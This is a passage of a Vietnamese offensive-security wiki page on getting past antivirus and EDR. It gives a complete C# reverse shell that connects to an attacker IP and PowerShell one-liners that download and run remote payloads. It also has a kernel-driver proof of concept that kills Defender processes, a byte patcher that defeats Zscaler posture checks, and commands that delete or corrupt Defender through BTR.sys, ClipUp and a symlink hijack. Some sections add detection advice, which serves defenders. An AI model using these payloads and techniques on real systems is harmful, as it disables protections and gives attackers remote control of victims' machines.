C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```

**Defender hiện tại sẽ kết thúc tiến trình rất nhanh.**

### Biên dịch reverse shell của riêng chúng ta

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Reverse shell C# đầu tiên

Biên dịch bằng:

```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```

Sử dụng nó với:

```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
```

### Sử dụng compiler C#

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```

[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Tự động tải xuống và thực thi:

```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```


{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Danh sách C# obfuscator: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++

```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Ví dụ sử dụng python để build injector:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Các công cụ khác

```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```

### Thêm

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Vô hiệu hóa AV/EDR từ Kernel Space

Storm-2603 đã sử dụng một tiện ích console nhỏ có tên **Antivirus Terminator** để vô hiệu hóa các biện pháp bảo vệ endpoint trước khi triển khai ransomware. Công cụ này mang theo **driver dễ bị tấn công nhưng *được ký*** của riêng nó và lạm dụng driver đó để thực hiện các thao tác kernel có đặc quyền mà ngay cả các dịch vụ AV Protected-Process-Light (PPL) cũng không thể chặn.<sup>[[12]](#references)</sup>

Điểm chính
1. **Driver được ký**: Tệp được ghi xuống đĩa là `ServiceMouse.sys`, nhưng binary thực chất là driver được ký hợp lệ `AToolsKrnl64.sys` thuộc “System In-Depth Analysis Toolkit” của Antiy Labs. Vì driver có chữ ký Microsoft hợp lệ nên nó vẫn được tải ngay cả khi Driver-Signature-Enforcement (DSE) được bật.
2. **Cài đặt service**:
   ```powershell
   sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
   sc start  ServiceMouse
   ```
   Dòng đầu tiên đăng ký driver dưới dạng **kernel service**, còn dòng thứ hai khởi động driver để `\\.\ServiceMouse` có thể được truy cập từ user land.
3. **Các IOCTL do driver cung cấp**
   | Mã IOCTL | Khả năng                              |
   |-----------:|-----------------------------------------|
   | `0x99000050` | Kết thúc một process bất kỳ theo PID (được dùng để tắt các dịch vụ Defender/EDR) |
   | `0x990000D0` | Xóa một file bất kỳ trên đĩa |
   | `0x990001D0` | Gỡ tải driver và xóa service |

   Proof-of-concept C tối giản:
   ```c
   #include <windows.h>
   
   int main(int argc, char **argv){
       DWORD pid = strtoul(argv[1], NULL, 10);
       HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
       DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
       CloseHandle(hDrv);
       return 0;
   }
   ```
4. **Vì sao cách này hiệu quả**: BYOVD bỏ qua hoàn toàn các cơ chế bảo vệ ở user-mode; mã chạy trong kernel có thể mở các tiến trình *được bảo vệ*, chấm dứt chúng hoặc can thiệp vào các đối tượng kernel, bất kể PPL/PP, ELAM hay các tính năng hardening khác.

Phát hiện / Giảm thiểu
•  Bật danh sách chặn driver dễ bị tấn công của Microsoft (`HVCI`, `Smart App Control`) để Windows từ chối tải `AToolsKrnl64.sys`.
•  Theo dõi việc tạo các dịch vụ *kernel* mới và cảnh báo khi driver được tải từ thư mục cho phép ghi bởi mọi người hoặc không có trong allow-list.
•  Theo dõi các handle ở user-mode tới đối tượng thiết bị tùy chỉnh, sau đó là các lệnh gọi `DeviceIoControl` đáng ngờ.

### Vượt qua kiểm tra tư thế thiết bị của Zscaler Client Connector bằng cách vá nhị phân trên ổ đĩa

**Client Connector** của Zscaler áp dụng các quy tắc tư thế thiết bị cục bộ và dựa vào Windows RPC để truyền kết quả đến các thành phần khác. Hai lựa chọn thiết kế yếu khiến việc vượt qua hoàn toàn có thể thực hiện được:

1. Việc đánh giá tư thế thiết bị diễn ra **hoàn toàn ở phía client** (một giá trị boolean được gửi đến máy chủ).
2. Các endpoint RPC nội bộ chỉ xác thực rằng tệp thực thi kết nối **được Zscaler ký** (thông qua `WinVerifyTrust`).<sup>[[11]](#references)</sup>

Bằng cách **vá bốn nhị phân đã ký trên ổ đĩa**, có thể vô hiệu hóa cả hai cơ chế:

| Nhị phân | Logic gốc được vá | Kết quả |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Luôn trả về `1` nên mọi lần kiểm tra đều đạt yêu cầu |
| `ZSAService.exe` | Lệnh gọi gián tiếp tới `WinVerifyTrust` | Bị thay bằng NOP ⇒ mọi tiến trình (kể cả chưa ký) đều có thể kết nối với các RPC pipe |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Được thay bằng `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Các bước kiểm tra tính toàn vẹn của tunnel | Bị bỏ qua |

Trích đoạn patcher tối giản:

```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
    data = f.read()
    off = data.find(pattern)
    if off == -1:
        print("pattern not found")
    else:
        f.seek(off)
        f.write(replacement)
```

Sau khi thay thế các tệp gốc và khởi động lại ngăn xếp dịch vụ:

* **Tất cả** kiểm tra trạng thái đều hiển thị **xanh/đạt chuẩn**.
* Các binary chưa ký hoặc đã bị sửa đổi có thể mở các endpoint RPC named-pipe (ví dụ: `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Máy chủ bị xâm phạm có quyền truy cập không hạn chế vào mạng nội bộ được xác định bởi các chính sách Zscaler.

Case study này cho thấy các quyết định tin cậy hoàn toàn ở phía client và những bước kiểm tra chữ ký đơn giản có thể bị vô hiệu hóa chỉ bằng vài bản vá byte.

## Lạm dụng chức năng đáng tin cậy của Microsoft Defender `BTR.sys`

Driver **Boot-Time Removal** của Defender là một ví dụ đối lập hữu ích với BYOVD kiểu cổ điển. `BTR.sys` là một thành phần khắc phục sự cố được Microsoft ký hợp lệ, không có lỗi memory-corruption và không có giao diện IOCTL; thay vào đó, sau khi có quyền administrator và `SeLoadDriverPrivilege`, operator có thể giả mạo giao dịch khắc phục sự cố riêng của driver để thực hiện các thao tác tệp/registry Ring-0 vốn được thiết kế sẵn. Đây là một **primitive vô hiệu hóa AV/EDR sau khi đã xâm nhập, không phải phương thức truy cập ban đầu hay leo thang đặc quyền**, và có thể trích xuất driver từ resource `BOOTTIMETOOL` trong chính `MpEngine.dll` của mục tiêu thay vì đưa vào một driver bên thứ ba dễ bị chú ý.<sup>[[36]](#references)</sup>

### Chuẩn bị driver chạy một lần

Defender thường ghi resource này thành tệp `[a-z]{8}.sys` có tên ngẫu nhiên và đăng ký một kernel service có tên tương tự. `DriverEntry` đọc giá trị `Args` của service, mở NTFS ADS được tham chiếu, giải mã và xác thực danh sách hành động, ghi phản hồi, rồi trả về `0xC0000056` (`STATUS_DELETE_PENDING`) sau khi thực thi thành công để driver được unload thay vì tiếp tục thường trú. Một service giả mạo có các giá trị đặc trưng sau.<sup>[[36]](#references)[[37]](#references)</sup>

```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```

Luồng `:changelist` chứa một blob được mã hóa bằng RC4. Các bản build được phân tích đều dùng lại một khóa cố định dài 256 byte, vì vậy mã hóa không phải là ranh giới phân quyền. Plaintext hợp lệ có header toàn cục dài 24 byte (`Magic=0xFEE1DEAD`, `Version=2`, `PayloadOffset=0x10`, CRC của header và transaction ID được tạo từ payload), theo sau là đường dẫn feedback UTF-16 kết thúc bằng ký tự null và số lượng item tùy ý. Mỗi item có header dài 16 byte (`DataSize`, `Action`, `HeaderCRC`, `DataCRC`), cộng với dữ liệu riêng theo action và kết thúc bằng **chính xác bốn byte NUL**. Mỗi vùng header/data được kiểm tra độc lập bằng CRC-32 polynomial `0xEDB88320`, trạng thái ban đầu là `0xFFFFFFFF` và **không có final XOR** (`~CRC32`); trạng thái CRC được đặt lại cho mỗi vùng.<sup>[[36]](#references)[[37]](#references)</sup>

Các action ID được chấp nhận cho phép sử dụng những kernel primitive sau.<sup>[[36]](#references)[[37]](#references)</sup>

| ID | Dữ liệu item | Kết quả |
| --- | --- | --- |
| 1 | `[UTF-16 path]` | Xóa file, kể cả file đang bị khóa |
| 2 | `[UTF-16 path]` | Xóa thư mục rỗng |
| 3 | `[Flags][source][destination]` | Di chuyển file đến một protected path do attacker chọn; destination rỗng nghĩa là xóa |
| 4 | `[Flags][key path]` | Xóa đệ quy registry key |
| 5 | `[Flags][key path + "\\" + value]` | Xóa registry value |
| 6 | `[Flags][type][size][key path + "\\" + value][data]` | Tạo/cập nhật registry value và tạo các key path còn thiếu |

Với action 5 và 6, dấu phân cách key/value trên wire là **hai dấu gạch chéo ngược liên tiếp**; path được định dạng theo quy ước thông thường sẽ không được tách đúng. File feedback phần lớn phản ánh lại request, nhưng bốn byte dữ liệu đầu tiên của mỗi item được thay bằng `NTSTATUS` tương ứng. Với action 1 và 2, vốn không có trường flags ở đầu, BTR dịch path vào bốn byte dành riêng ở cuối để tạo chỗ cho status.<sup>[[36]](#references)</sup>

### Quy trình `BTR_CLI` và khoảng thời gian early-boot

[`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI) triển khai toàn bộ chuỗi: trích xuất `BTR.sys` từ Defender cục bộ, tạo `<random>.sys:changelist` và một feedback stream, tuần tự hóa/tính checksum/mã hóa các action được nối chuỗi, trực tiếp tạo service registry key, sau đó gọi `NtLoadDriver` khi dùng `-trigger now` hoặc để driver ở chế độ system-start với `-trigger boot`. Stage trực tiếp vào registry giúp tránh luồng `CreateServiceW` thông thường của SCM, do đó **không tạo ra sự kiện cài đặt service Event ID 7045**. Các artifact được kích hoạt khi boot có thể được xóa sau đó bằng `BTR_CLI.exe -cleanup <service_name>`.<sup>[[36]](#references)[[37]](#references)</sup>

```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```

`Start=0` không thể sử dụng vì BTR thực hiện I/O trên tệp từ `DriverEntry` trước khi storage stack và liên kết `SystemRoot` sẵn sàng. `Start=1` cùng với group có độ ưu tiên cao `Boot Bus Extender` sẽ thực thi trong Phase 1: NTFS có thể sử dụng, nhưng nhiều security driver khởi động cùng hệ thống và dịch vụ EDR ở user mode chưa khởi tạo. Các filter khởi động cùng boot như `WdFilter` có thể đã được tải, nhưng BTR có thể xóa binary hoặc cấu hình service của chúng trước lần khởi động tiếp theo, đồng thời xóa các tệp thực thi của service trước khi SCM khởi chạy chúng. ELAM không khắc phục được khoảng trống này vì BTR chạy sau quá trình đánh giá boot-start và có chữ ký Microsoft hợp lệ.<sup>[[36]](#references)</sup>

Nhiều hành động được thực hiện trong một transaction. PoC thêm Action 1 vào đầu danh sách, nhắm đến `\SystemRoot\Temp\BootClean.log` được hard-code: BTR tạo log này, sau đó xử lý yêu cầu xóa của chính nó và xóa log trước khi unload. Cách này giảm dấu vết, còn việc ghi phản hồi vào `<random>.sys:<random>.dat` cho phép xóa driver và cả hai stream cùng lúc.<sup>[[36]](#references)[[37]](#references)</sup>

### Các tương quan phát hiện có tín hiệu cao

Các rule chỉ dựa trên chữ ký và Microsoft vulnerable-driver blocklist không giải quyết được việc lạm dụng chức năng BTR vốn được thiết kế có chủ đích. Hãy ưu tiên các tương quan hành vi sau, đồng thời phân biệt lineage Defender hợp lệ với một launcher tùy ý.<sup>[[36]](#references)</sup>

- **Sysmon 15:** Việc tạo `.sys:changelist` là dấu hiệu phổ biến trong quá trình staging BTR. ADS `.dat` gắn với cùng tệp `.sys` đặc biệt đáng ngờ vì Defender hợp lệ thường đặt feedback trong `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\`.
- **Sysmon 12/13 không có System 7045:** Tương quan việc tạo trực tiếp `HKLM\SYSTEM\CurrentControlSet\Services\<random>` chứa `Args=...:changelist` và `Group=Boot Bus Extender` với việc không có sự kiện cài đặt SCM tương ứng.
- **Sysmon 6 -> 23:** Tương quan việc tải một driver BTR đã biết từ lineage không thuộc Defender với thao tác xóa tệp tiếp theo do `System`/PID 4 thực hiện, đặc biệt khi đó là các binary bảo mật.
- **Sysmon 11 -> 23:** Cảnh báo khi `System`/PID 4 nhanh chóng tạo rồi xóa `\SystemRoot\Temp\BootClean.log`.
- Hạn chế và audit việc cấp/bật `SeLoadDriverPrivilege`; chỉ riêng chữ ký Microsoft không đủ để tạo niềm tin khi driver của security tool được staging bởi `cmd.exe`, PowerShell hoặc một tiến trình không xác định.

## Lạm dụng Protected Process Light (PPL) để can thiệp AV/EDR bằng LOLBINs

Protected Process Light (PPL) thực thi hệ thống phân cấp signer/level, theo đó chỉ các tiến trình được bảo vệ ở cùng cấp hoặc cao hơn mới có thể can thiệp lẫn nhau. Về mặt tấn công, nếu có thể khởi chạy hợp lệ một binary hỗ trợ PPL và kiểm soát các đối số của nó, bạn có thể biến chức năng vô hại (ví dụ: ghi log) thành primitive ghi bị giới hạn, được PPL bảo vệ, nhắm vào các thư mục được AV/EDR bảo vệ.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

Điều gì khiến một tiến trình chạy dưới dạng PPL
- EXE đích (và mọi DLL được tải) phải được ký bằng EKU hỗ trợ PPL.
- Tiến trình phải được tạo bằng CreateProcess với các flag: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Phải yêu cầu protection level tương thích với signer của binary (ví dụ: `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` cho signer anti-malware, `PROTECTION_LEVEL_WINDOWS` cho signer Windows). Chọn sai level sẽ khiến thao tác tạo tiến trình thất bại.

Xem thêm phần giới thiệu tổng quan về PP/PPL và bảo vệ LSASS tại đây:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Công cụ launcher
- Helper mã nguồn mở: CreateProcessAsPPL (chọn protection level và chuyển tiếp đối số đến EXE đích):
  - [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Cách sử dụng:

```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```

LOLBIN primitive: ClipUp.exe
- Binary hệ thống đã ký `C:\Windows\System32\ClipUp.exe` tự khởi chạy và chấp nhận tham số để ghi tệp log vào đường dẫn do bên gọi chỉ định.
- Khi được khởi chạy dưới dạng tiến trình PPL, thao tác ghi tệp được thực hiện với cơ chế bảo vệ của PPL.
- ClipUp không phân tích được đường dẫn có dấu cách; hãy dùng đường dẫn ngắn 8.3 để trỏ đến các vị trí thường được bảo vệ.

Trợ giúp về đường dẫn ngắn 8.3
- Liệt kê tên ngắn: chạy `dir /x` trong từng thư mục cha.
- Tạo đường dẫn ngắn trong cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Chuỗi khai thác (khái quát)
1) Khởi chạy LOLBIN có khả năng chạy dưới dạng PPL (ClipUp) với `CREATE_PROTECTED_PROCESS` bằng một launcher (ví dụ: CreateProcessAsPPL).
2) Truyền tham số đường dẫn log của ClipUp để buộc tạo tệp trong một thư mục AV được bảo vệ (ví dụ: Defender Platform). Nếu cần, hãy dùng tên ngắn 8.3.
3) Nếu AV thường mở/khóa tệp nhị phân mục tiêu khi đang chạy (ví dụ: MsMpEng.exe), hãy lên lịch ghi tệp lúc khởi động, trước khi AV khởi chạy, bằng cách cài đặt một dịch vụ tự khởi động chạy sớm hơn một cách đáng tin cậy. Xác thực thứ tự khởi động bằng Process Monitor (ghi nhật ký khởi động).
4) Khi khởi động lại, thao tác ghi được PPL bảo vệ sẽ diễn ra trước khi AV khóa các tệp nhị phân của nó, làm hỏng tệp mục tiêu và ngăn AV khởi chạy.

Lệnh gọi mẫu (đường dẫn đã được lược bỏ/rút gọn để đảm bảo an toàn):

```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```

Ghi chú và giới hạn
- Bạn không thể kiểm soát nội dung mà ClipUp ghi ngoài vị trí ghi; primitive này phù hợp để làm hỏng dữ liệu hơn là chèn nội dung chính xác.
- Cần quyền local admin/SYSTEM để cài đặt/khởi động service và cần có khoảng thời gian để reboot.
- Thời điểm rất quan trọng: target không được mở; thực thi lúc khởi động giúp tránh khóa file.

Phát hiện
- Tạo process `ClipUp.exe` với các đối số bất thường, đặc biệt khi process cha là launcher không tiêu chuẩn, vào khoảng thời gian khởi động.
- Service mới được cấu hình để tự khởi động các binary đáng ngờ và luôn khởi động trước Defender/AV. Điều tra việc tạo/chỉnh sửa service trước khi Defender gặp lỗi khởi động.
- Giám sát tính toàn vẹn file trên các binary/thư mục Platform của Defender; chú ý các file được tạo/chỉnh sửa bất ngờ bởi process có cờ protected-process.
- Telemetry ETW/EDR: tìm các process được tạo bằng `CREATE_PROTECTED_PROCESS` và việc sử dụng cấp độ PPL bất thường bởi các binary không phải AV.

Biện pháp giảm thiểu
- WDAC/Code Integrity: hạn chế binary đã ký nào được phép chạy dưới dạng PPL và được chạy bởi tiến trình cha nào; chặn việc gọi ClipUp ngoài các ngữ cảnh hợp lệ.
- Vệ sinh service: hạn chế việc tạo/chỉnh sửa các service tự khởi động và giám sát thao túng thứ tự khởi động.
- Đảm bảo đã bật tamper protection và các tính năng bảo vệ khởi chạy sớm của Defender; điều tra lỗi khởi động cho thấy binary bị hỏng.
- Cân nhắc tắt tính năng tạo tên ngắn 8.3 trên các volume lưu trữ công cụ bảo mật nếu môi trường của bạn tương thích (kiểm thử kỹ).

## Tampering Microsoft Defender via Platform Version Folder Symlink Hijack

Windows Defender chọn platform để chạy bằng cách liệt kê các thư mục con trong:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Nó chọn thư mục con có chuỗi phiên bản theo thứ tự từ điển cao nhất (ví dụ: `4.18.25070.5-0`), rồi khởi chạy các process dịch vụ Defender từ đó (cập nhật các đường dẫn service/registry tương ứng). Cơ chế chọn này tin cậy các mục thư mục, bao gồm cả directory reparse point (symlink). Administrator có thể lợi dụng điều này để chuyển hướng Defender đến một đường dẫn có thể ghi bởi attacker và thực hiện DLL sideloading hoặc làm gián đoạn service.<sup>[[21]](#references)[[22]](#references)</sup>

Điều kiện tiên quyết
- Local Administrator (cần thiết để tạo thư mục/symlink trong thư mục Platform)
- Có thể reboot hoặc kích hoạt việc chọn lại platform của Defender (khởi động lại service lúc boot)
- Chỉ cần các công cụ có sẵn (mklink)

Vì sao cách này hiệu quả
- Defender chặn thao tác ghi trong các thư mục của chính nó, nhưng cơ chế chọn platform tin cậy các mục thư mục và chọn phiên bản cao nhất theo thứ tự từ điển mà không xác thực rằng đích phân giải đến đường dẫn được bảo vệ/đáng tin cậy.

Các bước thực hiện (ví dụ)
1) Chuẩn bị một bản sao có thể ghi của thư mục platform hiện tại, ví dụ: `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Tạo một directory symlink phiên bản cao hơn bên trong Platform trỏ đến thư mục của bạn:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Lựa chọn trigger (khuyến nghị khởi động lại):
```cmd
shutdown /r /t 0
```
4) Xác minh MsMpEng.exe (WinDefend) chạy từ đường dẫn đã chuyển hướng:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Bạn nên quan sát đường dẫn tiến trình mới trong `C:\TMP\AV\` và cấu hình service/registry phản ánh vị trí đó.

Các tùy chọn hậu khai thác
- DLL sideloading/code execution: Thả/thay thế các DLL mà Defender tải từ thư mục ứng dụng của nó để thực thi code trong các tiến trình của Defender. Xem phần phía trên: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Dừng service/từ chối dịch vụ: Xóa symlink phiên bản để khi khởi động lần tiếp theo, đường dẫn đã cấu hình không thể được phân giải và Defender không khởi động được:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```

> [!TIP]
> Lưu ý: Bản thân kỹ thuật này không giúp leo thang đặc quyền; kỹ thuật này yêu cầu quyền admin.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Các đội Red có thể chuyển cơ chế né tránh lúc chạy từ C2 implant sang chính module mục tiêu bằng cách hook Import Address Table (IAT) của module đó và chuyển các API được chọn qua đoạn mã độc lập vị trí (PIC) do kẻ tấn công kiểm soát. Cách này mở rộng phạm vi né tránh ra ngoài tập API nhỏ mà nhiều kit cung cấp (ví dụ: CreateProcessA), đồng thời áp dụng các biện pháp bảo vệ tương tự cho BOFs và DLL hậu khai thác.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Phương pháp tổng quan
- Đưa một PIC blob vào cùng với module mục tiêu bằng reflective loader (đặt ở đầu hoặc đi kèm). PIC phải tự chứa và độc lập vị trí.
- Khi host DLL được tải, duyệt IMAGE_IMPORT_DESCRIPTOR của nó và vá các mục IAT của những import cần nhắm đến (ví dụ: CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) để trỏ đến các PIC wrapper đơn giản.
- Mỗi PIC wrapper thực hiện các biện pháp né tránh trước khi gọi tiếp đến địa chỉ API thật. Các biện pháp né tránh thường dùng gồm:
  - Mask/unmask bộ nhớ trước và sau lệnh gọi (ví dụ: mã hóa các vùng beacon, đổi RWX→RX, thay đổi tên/quyền của trang bộ nhớ).
  - Giả mạo call stack: tạo một stack có vẻ vô hại rồi chuyển sang API mục tiêu để phân tích call stack cho kết quả là các frame dự kiến.<sup>[[9]](#references)</sup>
- Để tương thích, hãy export một interface để script Aggressor (hoặc công cụ tương đương) có thể đăng ký các API cần hook cho Beacon, BOFs và DLL hậu khai thác.

Tại sao dùng IAT hooking ở đây
- Hoạt động với mọi đoạn mã sử dụng import đã hook, không cần sửa mã công cụ hoặc dựa vào Beacon để proxy các API cụ thể.
- Bao phủ các DLL hậu khai thác: hook LoadLibrary* cho phép chặn các lần tải module (ví dụ: System.Management.Automation.dll, clr.dll) và áp dụng cùng biện pháp né tránh bằng masking/stack cho các lệnh gọi API của chúng.
- Khôi phục khả năng sử dụng đáng tin cậy các lệnh hậu khai thác tạo process trước những cơ chế phát hiện dựa trên call stack bằng cách bọc CreateProcessA/W.

Phác thảo IAT hook tối thiểu (mã giả C/C++ x64)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Ghi chú
- Áp dụng bản vá sau relocations/ASLR và trước lần đầu sử dụng import. Các reflective loader như TitanLdr/AceLdr minh họa việc hooking trong DllMain của module đã tải.
- Giữ wrapper thật nhỏ và an toàn với PIC; phân giải API thật thông qua giá trị IAT gốc đã lưu trước khi vá hoặc thông qua LdrGetProcedureAddress.
